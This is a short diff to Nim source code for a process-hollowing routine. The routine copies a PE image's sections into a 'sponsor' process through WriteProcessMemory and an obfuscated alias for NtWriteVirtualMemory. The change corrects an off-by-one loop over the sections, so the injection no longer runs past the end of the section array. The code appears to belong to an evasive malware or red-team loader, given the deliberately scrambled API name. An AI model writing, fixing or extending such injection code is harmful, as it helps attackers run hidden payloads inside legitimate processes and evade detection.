@@ -84,8 +84,8 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             quit() 
 
         # Copy PE sections to sponsor process
-        when not defined(release): echo "[*] Copying PE sections to sponsor process"    
-        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
+        when not defined(release): echo "[*] Copying PE sections to sponsor process" 
+        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
             if WriteProcessMemory(
                 sponsorProcessHandle,
                 newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
@@ -181,7 +181,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
 
         # Copy PE sections to sponsor process
         when not defined(release): echo "[*] Copying PE sections to sponsor process"    
-        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
+        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
             if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
                 sponsorProcessHandle,
                 newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
